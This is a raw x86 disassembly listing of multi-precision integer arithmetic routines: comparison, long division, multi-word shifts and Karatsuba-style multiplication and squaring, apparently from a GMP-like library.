mov dword [edi + 0x1c], eax
lea edi, [edi + 0x20]
lea esi, [esi + 0x20]
lea edx, [edx + 0x20]
dec ecx
jne 0x808c2d8
sbb eax, eax
neg eax
pop esi
pop edi
ret
push ebp
mov ebp, esp
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
dec edx
js 0x808c34b
mov eax, dword [ecx + edx*4]
cmp dword [ebx + edx*4], eax
jne 0x808c350
dec edx
jns 0x808c340
xor eax, eax
pop ebx
leave
ret
seta al
movzx eax, al
lea eax, [eax + eax - 1]
jmp 0x808c34d
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
cmp dword [arg_1ch], 1
mov dword [var_10h], 0
mov esi, dword [arg_14h]
je 0x808c67e
jle 0x808c665
cmp dword [arg_1ch], 2
je 0x808c55b
mov eax, esi
mov ebx, dword [arg_10h]
mov edi, dword [arg_1ch]
sub eax, dword [arg_1ch]
mov ecx, dword [arg_1ch]
mov edx, dword [arg_1ch]
lea ebx, [ebx + eax*4]
mov eax, dword [arg_18h]
mov dword [arg_10h], ebx
mov edi, dword [eax + edi*4 - 4]
mov edx, dword [eax + edx*4 - 8]
mov dword [var_2ch], edi
mov dword [var_20h], edx
mov edi, ebx
mov ebx, dword [ebx + ecx*4 - 4]
cmp ebx, dword [var_2ch]
jb 0x808c42a
ja 0x808c3fc
mov eax, ecx
mov dword [esp], edi
dec eax
mov dword [var_8h], eax
mov eax, dword [arg_18h]
mov dword [var_4h], eax
call fcn.0808c330
test eax, eax
js 0x808c42a
mov ebx, dword [arg_10h]
mov edx, dword [arg_1ch]
mov ecx, dword [arg_18h]
mov dword [var_4h], ebx
mov dword [esp], ebx
mov dword [var_ch], edx
mov dword [var_8h], ecx
call fcn.0808d570
mov dword [var_10h], 1
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
mov ebx, dword [eax + edi*4 - 4]
mov eax, dword [arg_ch]
add eax, esi
sub eax, dword [arg_1ch]
dec eax
mov dword [var_1ch], eax
js 0x808c50a
lea esi, [esi]
mov edx, dword [arg_ch]
cmp dword [var_1ch], edx
jl 0x808c529
sub dword [arg_10h], 4
mov ecx, dword [arg_1ch]
mov esi, dword [arg_10h]
mov ecx, dword [esi + ecx*4]
mov dword [var_24h], ecx
cmp ebx, dword [var_2ch]
mov esi, 0xffffffff
je 0x808c4b0
mov edx, dword [arg_1ch]
mov ecx, dword [arg_10h]
mov eax, dword [ecx + edx*4 - 4]
mov edx, ebx
div dword [var_2ch]
mov ecx, edx
mov esi, eax
mov eax, dword [var_20h]
mul esi
cmp edx, ecx
mov ebx, eax
jbe 0x808c515
add ecx, dword [var_2ch]
dec esi
cmp ecx, dword [var_2ch]
jb 0x808c4b0
cmp ebx, dword [var_20h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_20h]
cmp edx, ecx
ja 0x808c488
jne 0x808c4b0
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
cmp ebx, dword [eax + edi*4 - 8]
ja 0x808c488
nop
mov edx, dword [arg_1ch]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
mov ebx, dword [arg_10h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov dword [esp], ebx
call fcn.0808d600
cmp dword [var_24h], eax
je 0x808c4ed
mov edi, dword [arg_1ch]
mov eax, dword [arg_18h]
mov dword [var_4h], ebx
mov dword [esp], ebx
dec esi
mov dword [var_ch], edi
mov dword [var_8h], eax
call fcn.0808c2a0
mov edx, dword [var_1ch]
mov ecx, dword [arg_8h]
mov edi, dword [arg_10h]
mov dword [ecx + edx*4], esi
dec edx
mov esi, dword [arg_1ch]
mov dword [var_1ch], edx
mov ebx, dword [edi + esi*4 - 4]
jns 0x808c440
mov eax, dword [var_10h]
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
jne 0x808c4b0
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
cmp ebx, dword [eax + edi*4 - 8]
ja 0x808c488
jmp 0x808c4b0
mov esi, dword [arg_1ch]
mov edi, dword [arg_10h]
mov edx, dword [arg_1ch]
mov esi, dword [edi + esi*4 - 4]
dec edx
mov dword [var_24h], esi
js 0x808c54d
lea esi, [esi]
mov edi, dword [arg_10h]
mov eax, dword [edi + edx*4]
mov dword [edi + edx*4 + 4], eax
dec edx
jns 0x808c540
mov eax, dword [arg_10h]
mov dword [eax], 0
jmp 0x808c45c
mov edi, dword [arg_10h]
mov ecx, dword [arg_18h]
mov ebx, dword [arg_18h]
lea eax, [edi + esi*4]
mov ecx, dword [ecx + 4]
lea edx, [eax - 8]
mov ebx, dword [ebx]
mov eax, dword [eax - 8]
mov dword [arg_10h], edx
mov edx, dword [edx + 4]
mov dword [var_18h], ecx
mov dword [var_30h], ebx
cmp edx, ecx
jb 0x808c595
ja 0x808c588
cmp eax, ebx
jb 0x808c595
mov dword [var_10h], 1
sub eax, dword [var_30h]
sbb edx, dword [var_18h]
mov ecx, dword [arg_ch]
lea esi, [esi + ecx - 3]
test esi, esi
mov dword [var_14h], esi
js 0x808c608
mov ebx, dword [arg_ch]
cmp dword [var_14h], ebx
jl 0x808c657
sub dword [arg_10h], 4
cmp edx, dword [var_18h]
je 0x808c615
div dword [var_18h]
mov dword [var_2ch], eax
mov ecx, edx
mul dword [var_30h]
mov esi, dword [arg_10h]
mov esi, dword [esi]
mov dword [var_28h], esi
nop
lea esi, [esi]
cmp edx, ecx
ja 0x808c5db
jne 0x808c5ec
cmp eax, dword [var_28h]
jbe 0x808c5ec
add ecx, dword [var_18h]
dec dword [var_2ch]
sub eax, dword [var_30h]
sbb edx, 0
cmp ecx, dword [var_18h]
jae 0x808c5d0
mov edi, dword [var_14h]
mov esi, dword [var_2ch]
mov ebx, dword [arg_8h]
mov dword [ebx + edi*4], esi
mov edi, dword [var_28h]
sub edi, eax
sbb ecx, edx
mov eax, edi
mov edx, ecx
dec dword [var_14h]
jns 0x808c5a3
mov ecx, dword [arg_10h]
mov dword [ecx + 4], edx
mov dword [ecx], eax
jmp 0x808c50a
lea ecx, [edx + eax]
mov dword [var_2ch], 0xffffffff
cmp ecx, edx
jae 0x808c642
sub ecx, dword [var_30h]
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov eax, dword [edi]
mov edx, ecx
mov ecx, dword [var_14h]
add eax, dword [var_30h]
adc edx, 0
mov dword [ebx + ecx*4], 0xffffffff
jmp 0x808c603
mov edx, dword [var_30h]
lea eax, [edx - 1]
test edx, edx
cmovne edx, eax
mov eax, dword [var_30h]
neg eax
jmp 0x808c5c3
mov esi, dword [arg_10h]
mov dword [esi], 0
jmp 0x808c5b3
mov eax, dword [arg_1ch]
test eax, eax
jne 0x808c3ad
mov eax, 1
cdq
idiv dword [var_10h]
jmp 0x808c50d
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov ebx, dword [eax]
mov ecx, dword [edx + esi*4 - 4]
cmp ecx, ebx
jb 0x808c697
sub ecx, ebx
mov dword [var_10h], 1
mov eax, dword [arg_8h]
mov edi, dword [arg_ch]
lea eax, [eax + edi*4]
mov edi, esi
sub edi, 2
mov dword [arg_8h], eax
js 0x808c6bf
mov edx, dword [arg_10h]
mov esi, dword [arg_8h]
mov eax, dword [edx + edi*4]
mov edx, ecx
div ebx
mov dword [esi + edi*4], eax
mov ecx, edx
dec edi
jns 0x808c6aa
mov eax, dword [arg_ch]
mov edi, dword [arg_ch]
shl eax, 2
sub dword [arg_8h], eax
dec edi
js 0x808c6e1
xor esi, esi
mov edx, ecx
mov eax, esi
div ebx
mov ecx, edx
mov edx, dword [arg_8h]
mov dword [edx + edi*4], eax
dec edi
jns 0x808c6d0
mov ebx, dword [arg_10h]
mov dword [ebx], ecx
jmp 0x808c50a
nop
nop
nop
nop
nop
push edi
push esi
push ebx
mov edi, dword [arg_10h]
mov esi, dword [arg_14h]
mov edx, dword [arg_18h]
mov ecx, dword [arg_1ch]
sub esi, 4
mov ebx, dword [esi + edx*4]
xor eax, eax
shld eax, ebx, cl
dec edx
je 0x808c73f
push eax
test dl, 1
jne 0x808c72a
mov eax, ebx
lea esi, [esi]
mov ebx, dword [esi + edx*4]
shld eax, ebx, cl
mov dword [edi + edx*4], eax
dec edx
mov eax, dword [esi + edx*4]
shld ebx, eax, cl
mov dword [edi + edx*4], ebx
dec edx
jne 0x808c720
shl eax, cl
mov dword [edi], eax
pop eax
pop ebx
pop esi
pop edi
ret
shl ebx, cl
mov dword [edi], ebx
pop ebx
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
push ebx
mov edi, dword [arg_10h]
mov esi, dword [arg_14h]
mov edx, dword [arg_18h]
mov ecx, dword [arg_1ch]
lea edi, [edi + edx*4 - 4]
lea esi, [esi + edx*4]
neg edx
mov ebx, dword [esi + edx*4]
xor eax, eax
shrd eax, ebx, cl
inc edx
je 0x808c79f
push eax
test dl, 1
jne 0x808c78a
mov eax, ebx
nop
mov ebx, dword [esi + edx*4]
shrd eax, ebx, cl
mov dword [edi + edx*4], eax
inc edx
mov eax, dword [esi + edx*4]
shrd ebx, eax, cl
mov dword [edi + edx*4], ebx
inc edx
jne 0x808c780
shr eax, cl
mov dword [edi], eax
pop eax
pop ebx
pop esi
pop edi
ret
shr ebx, cl
mov dword [edi], ebx
pop ebx
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_10h]
mov edi, dword [arg_8h]
add eax, dword [arg_18h]
cmp dword [arg_18h], 0x1f
lea eax, [edi + eax*4 - 4]
mov dword [var_10h], eax
jg 0x808c8d3
mov edx, dword [arg_18h]
xor eax, eax
test edx, edx
je 0x808c851
mov edx, dword [arg_14h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808c8b4
je 0x808c891
xor eax, eax
cmp eax, dword [arg_10h]
jge 0x808c814
mov dword [edi + eax*4], 0
inc eax
cmp eax, dword [arg_10h]
jl 0x808c807
xor eax, eax
mov ecx, dword [arg_10h]
mov ebx, 1
mov dword [edi + ecx*4], eax
add edi, 4
cmp ebx, dword [arg_18h]
jge 0x808c851
lea esi, [esi]
mov edx, dword [arg_14h]
mov eax, dword [edx + ebx*4]
cmp eax, 1
ja 0x808c875
mov eax, 0
je 0x808c859
mov edx, dword [arg_10h]
inc ebx
mov dword [edi + edx*4], eax
add edi, 4
cmp ebx, dword [arg_18h]
jl 0x808c830
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_10h]
mov eax, dword [arg_ch]
mov dword [var_4h], edi
mov dword [esp], edi
mov dword [var_ch], ecx
mov dword [var_8h], eax
call fcn.0808c2a0
jmp 0x808c842
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [esp], edi
mov dword [var_8h], edx
mov dword [var_4h], ecx
call fcn.08090d80
jmp 0x808c842
xor edx, edx
cmp edx, dword [arg_10h]
jge 0x808c814
lea esi, [esi]
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [edi + edx*4], eax
inc edx
cmp edx, dword [arg_10h]
jl 0x808c8a0
jmp 0x808c814
mov dword [var_ch], eax
mov edx, dword [arg_ch]
mov dword [esp], edi
mov eax, dword [arg_10h]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cae0
jmp 0x808c816
mov ecx, dword [arg_18h]
mov edx, dword [arg_14h]
lea ebx, [ecx*8 + 0x10]
sub esp, ebx
mov dword [var_ch], ecx
lea eax, [var_23h]
mov dword [var_8h], edx
mov ecx, dword [arg_ch]
and eax, 0xfffffff0
mov dword [esp], edi
mov dword [var_18h], eax
mov dword [var_sp_10h], eax
mov dword [var_4h], ecx
call fcn.0808cc10
mov eax, dword [arg_18h]
mov edx, dword [arg_18h]
sub dword [arg_10h], edx
shl eax, 2
add dword [arg_ch], eax
add edi, eax
cmp dword [arg_10h], edx
jl 0x808c9d8
sub esp, ebx
mov dword [var_20h], eax
lea ecx, [var_23h]
and ecx, 0xfffffff0
mov dword [var_1ch], ecx
cmp dword [arg_18h], 0x1f
jg 0x808cab3
mov eax, dword [arg_18h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [var_8h], edx
mov eax, dword [var_1ch]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808cb40
mov edx, dword [var_1ch]
mov eax, dword [arg_18h]
mov dword [var_4h], edi
mov dword [esp], edi
mov dword [var_8h], edx
mov dword [var_ch], eax
call fcn.0808c2a0
mov ecx, dword [var_20h]
mov dword [var_14h], eax
mov esi, dword [arg_18h]
lea ebx, [ecx + edi]
mov ecx, dword [var_1ch]
add ecx, dword [var_20h]
mov eax, dword [ecx]
add ecx, 4
mov edx, eax
mov eax, dword [var_14h]
add eax, edx
mov dword [ebx], eax
add ebx, 4
cmp eax, edx
jae 0x808ca90
mov esi, dword [arg_18h]
dec esi
je 0x808c9c0
mov edx, dword [ecx]
add ecx, 4
inc edx
mov dword [ebx], edx
add ebx, 4
test edx, edx
jne 0x808ca90
dec esi
jne 0x808c9a5
nop
lea esi, [esi]
mov edx, dword [arg_18h]
add edi, dword [var_20h]
sub dword [arg_10h], edx
mov eax, dword [var_20h]
add dword [arg_ch], eax
cmp dword [arg_10h], edx
jge 0x808c930
mov eax, dword [arg_10h]
test eax, eax
jne 0x808c9e9
mov edx, dword [var_10h]
mov eax, dword [edx]
jmp 0x808c851
mov ecx, dword [arg_10h]
mov eax, dword [arg_ch]
mov edx, dword [arg_18h]
mov dword [var_sp_10h], ecx
mov dword [var_ch], eax
mov ecx, dword [arg_14h]
mov eax, dword [var_18h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808c7c0
mov dword [esp], edi
mov edx, dword [arg_18h]
mov ecx, dword [var_18h]
mov dword [var_4h], edi
mov dword [var_ch], edx
mov dword [var_8h], ecx
call fcn.0808c2a0
mov dword [var_14h], eax
mov ecx, dword [var_18h]
mov esi, dword [arg_10h]
mov eax, dword [arg_18h]
shl eax, 2
add ecx, eax
lea ebx, [eax + edi]
mov eax, dword [ecx]
add ecx, 4
mov edx, eax
mov eax, dword [var_14h]
add eax, edx
mov dword [ebx], eax
add ebx, 4
cmp eax, edx
jae 0x808ca6d
dec esi
je 0x808c9df
mov edx, dword [ecx]
add ecx, 4
inc edx
mov dword [ebx], edx
add ebx, 4
test edx, edx
jne 0x808ca6d
dec esi
jne 0x808ca56
jmp 0x808c9df
cmp ebx, ecx
je 0x808c9df
xor edx, edx
dec esi
cmp edx, esi
jge 0x808c9df
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808ca80
jmp 0x808c9df
cmp ebx, ecx
je 0x808c9c0
xor edx, edx
dec esi
cmp edx, esi
jge 0x808c9c0
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808caa3
jmp 0x808c9c0
mov edx, dword [var_18h]
mov ecx, dword [arg_18h]
mov eax, dword [arg_14h]
mov dword [var_sp_10h], edx
mov dword [var_ch], ecx
mov edx, dword [arg_ch]
mov ecx, dword [var_1ch]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cc10
jmp 0x808c95a
nop
push edi
push esi
push ebp
push ebx
mov edi, dword [arg_14h]
mov esi, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov ebx, dword [arg_20h]
lea edi, [edi + ecx*4]
lea esi, [esi + ecx*4]
neg ecx
xor ebp, ebp
mov esi, esi
mov eax, dword [esi + ecx*4]
mul ebx
add eax, ebp
mov dword [edi + ecx*4], eax
adc edx, 0
mov ebp, edx
inc ecx
jne 0x808cb00
mov eax, ebp
pop ebx
pop ebp
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edx, dword [arg_10h]
mov edi, dword [arg_14h]
mov ebx, dword [arg_8h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808cbf0
je 0x808cbd9
xor eax, eax
cmp eax, edi
jge 0x808cb71
mov dword [ebx + eax*4], 0
inc eax
cmp eax, edi
jl 0x808cb65
xor eax, eax
mov esi, 1
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jge 0x808cb9f
mov edx, dword [arg_10h]
mov eax, dword [edx + esi*4]
cmp eax, 1
ja 0x808cbc0
mov eax, 0
je 0x808cba7
inc esi
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jl 0x808cb82
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_ch]
mov dword [var_ch], edi
mov dword [var_4h], ebx
mov dword [esp], ebx
mov dword [var_8h], ecx
call fcn.0808c2a0
jmp 0x808cb94
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.08090d80
jmp 0x808cb94
xor edx, edx
cmp edx, edi
jge 0x808cb71
nop
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, edi
jl 0x808cbe0
jmp 0x808cb71
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.0808cae0
jmp 0x808cb73
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
test byte [arg_14h], 1
je 0x808ccd1
mov esi, dword [arg_14h]
dec esi
cmp esi, 0x1f
jg 0x808cca8
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_ch], esi
mov ecx, dword [arg_8h]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cb40
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov eax, dword [edx + esi*4]
mov dword [var_4h], ecx
mov dword [var_8h], esi
mov dword [var_ch], eax
mov eax, dword [arg_8h]
lea ebx, [eax + esi*4]
mov dword [esp], ebx
call fcn.08090d80
mov edx, dword [arg_ch]
mov ecx, dword [arg_8h]
mov dword [ecx + esi*8], eax
mov ecx, dword [arg_14h]
mov eax, dword [edx + esi*4]
mov dword [esp], ebx
mov dword [var_ch], eax
mov dword [var_8h], ecx
mov eax, dword [arg_10h]
mov dword [var_4h], eax
call fcn.08090d80
mov ecx, dword [arg_14h]
mov edx, eax
lea eax, [ecx + esi]
mov ecx, dword [arg_8h]
mov dword [ecx + eax*4], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov ecx, dword [arg_ch]
mov dword [var_10h], eax
mov dword [var_8h], edx
mov eax, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808cc10
jmp 0x808cc49
mov esi, dword [arg_14h]
sar esi, 1
cmp esi, 0x1f
jg 0x808d03c
mov edx, dword [arg_10h]
lea eax, [esi*4]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_ch]
mov dword [var_8h], edx
mov edx, dword [arg_14h]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808cb40
mov eax, dword [arg_ch]
mov dword [var_8h], esi
lea ebx, [eax + esi*4]
mov dword [var_4h], eax
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808d016
mov edx, dword [arg_ch]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_4h], ebx
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.0808d570
mov dword [var_bp_10h], 0
mov ecx, dword [arg_10h]
lea edi, [esi*4]
mov dword [var_8h], esi
mov ebx, ecx
mov dword [var_4h], ecx
add ebx, edi
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808cff5
mov eax, dword [arg_10h]
mov dword [var_ch], esi
mov dword [var_4h], ebx
mov dword [var_8h], eax
mov eax, dword [arg_8h]
add eax, edi
mov dword [esp], eax
call fcn.0808d570
xor dword [var_bp_10h], 1
cmp esi, 0x1f
jg 0x808cfc9
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
lea eax, [ecx + esi*4]
mov dword [var_4h], ecx
mov dword [var_8h], eax
mov eax, dword [arg_18h]
mov dword [esp], eax
call fcn.0808cb40
test esi, esi
jle 0x808cdd5
mov ecx, dword [arg_8h]
mov eax, dword [arg_14h]
mov edx, esi
lea ebx, [ecx + esi*4]
lea ecx, [ecx + eax*4]
mov eax, dword [ecx]
add ecx, 4
mov dword [ebx], eax
add ebx, 4
dec edx
jne 0x808cdc8
mov edi, dword [arg_14h]
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov ecx, dword [arg_14h]
add edi, esi
lea eax, [edx + edi*4]
mov dword [var_8h], eax
lea eax, [edx + ecx*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
mov ebx, eax
mov eax, dword [var_bp_10h]
test eax, eax
je 0x808cfa2
mov eax, dword [arg_14h]
mov ecx, dword [arg_8h]
mov edx, dword [arg_18h]
mov dword [var_ch], eax
lea eax, [ecx + esi*4]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808d570
sub ebx, eax
cmp esi, 0x1f
jg 0x808cf76
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_ch], esi
mov ecx, dword [arg_18h]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cb40
mov eax, dword [arg_18h]
mov edx, dword [arg_8h]
mov ecx, dword [arg_14h]
mov dword [var_8h], eax
lea eax, [edx + esi*4]
mov dword [var_ch], ecx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
je 0x808ceb0
mov eax, dword [arg_8h]
mov dword [var_14h], esi
lea ecx, [eax + edi*4]
mov edx, dword [ecx]
lea edi, [ecx + 4]
lea eax, [edx + ebx]
cmp eax, edx
mov dword [ecx], eax
mov ecx, edi
jae 0x808cf50
mov edx, esi
dec edx
mov dword [var_14h], edx
je 0x808ceb0
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808cf50
dec dword [var_14h]
jne 0x808ce98
xor edx, edx
cmp edx, esi
jge 0x808cec7
mov ecx, dword [arg_18h]
mov eax, dword [ecx + edx*4]
mov ecx, dword [arg_8h]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808ceb6
mov edx, dword [arg_18h]
lea eax, [esi*4]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
test eax, eax
je 0x808cca0
mov eax, dword [arg_14h]
mov edx, dword [arg_8h]
lea ecx, [edx + eax*4]
mov ebx, eax
mov edx, dword [ecx]
lea esi, [ecx + 4]
lea eax, [edx + 1]
cmp eax, edx
mov dword [ecx], eax
mov ecx, esi
jae 0x808cf2b
dec ebx
je 0x808cca0
mov edx, dword [esi]
add esi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808cf2b
dec ebx
jne 0x808cf14
jmp 0x808cca0
cmp ecx, esi
je 0x808cca0
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808cca0
mov esi, esi
mov eax, dword [esi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808cf40
jmp 0x808cca0
cmp ecx, edi
je 0x808ceb0
mov ebx, dword [var_14h]
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808ceb0
mov eax, dword [edi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808cf66
jmp 0x808ceb0
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov edx, dword [arg_ch]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cc10
jmp 0x808ce4f
mov eax, dword [arg_14h]
mov ecx, dword [arg_8h]
mov edx, dword [arg_18h]
mov dword [var_ch], eax
lea eax, [ecx + esi*4]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
jmp 0x808ce29
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov edx, dword [arg_8h]
mov dword [var_10h], eax
lea eax, [edx + esi*4]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cc10
jmp 0x808cdb6
mov eax, dword [arg_8h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
add eax, edi
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.0808d570
jmp 0x808cd90
mov eax, dword [arg_ch]
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.0808d570
mov dword [var_bp_10h], 1
jmp 0x808cd4a
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov ecx, dword [arg_8h]
mov dword [var_10h], eax
lea eax, [esi*4]
add edx, eax
add eax, dword [arg_ch]
mov dword [var_8h], edx
mov edx, dword [arg_14h]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808cc10
jmp 0x808cd0b
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edx, dword [arg_ch]
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808d130
je 0x808d119
xor eax, eax
cmp eax, edi
jge 0x808d0b1
mov dword [ebx + eax*4], 0
inc eax
cmp eax, edi
jl 0x808d0a5
xor eax, eax
mov esi, 1
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jge 0x808d0df
mov edx, dword [arg_ch]
mov eax, dword [edx + esi*4]
cmp eax, 1
ja 0x808d100
mov eax, 0
je 0x808d0e7
inc esi
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jl 0x808d0c2
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edi
mov dword [var_8h], edx
mov dword [var_4h], ebx
mov dword [esp], ebx
call fcn.0808c2a0
jmp 0x808d0d4
lea esi, [esi]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov dword [var_4h], ecx
call fcn.08090d80
jmp 0x808d0d4
xor edx, edx
cmp edx, edi
jge 0x808d0b1
nop
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, edi
jl 0x808d120
jmp 0x808d0b1
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.0808cae0
jmp 0x808d0b3
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
test byte [arg_10h], 1
mov edi, dword [arg_ch]
je 0x808d1f1
mov esi, dword [arg_10h]
dec esi
cmp esi, 0x1f
jg 0x808d1d5
mov eax, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], eax
call fcn.0808d080
mov eax, dword [edi + esi*4]
mov dword [var_4h], edi
mov dword [var_8h], esi
mov dword [var_ch], eax
mov eax, dword [arg_8h]
lea ebx, [eax + esi*4]
mov dword [esp], ebx
call fcn.08090d80
mov ecx, dword [arg_8h]
mov dword [ecx + esi*8], eax
mov eax, dword [edi + esi*4]
mov dword [esp], ebx
mov dword [var_4h], edi
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
call fcn.08090d80
mov ecx, dword [arg_10h]
mov edx, eax
lea eax, [ecx + esi]
mov ecx, dword [arg_8h]
mov dword [ecx + eax*4], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [arg_14h]
mov ecx, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_ch], edx
mov dword [esp], ecx
call fcn.0808d150
jmp 0x808d182
mov esi, dword [arg_10h]
sar esi, 1
cmp esi, 0x1f
jg 0x808d494
mov edx, dword [arg_10h]
mov ecx, dword [arg_8h]
lea eax, [edi + esi*4]
mov dword [var_4h], eax
mov dword [var_8h], esi
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808d080
lea ebx, [edi + esi*4]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808d47d
mov eax, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], edi
mov dword [var_4h], ebx
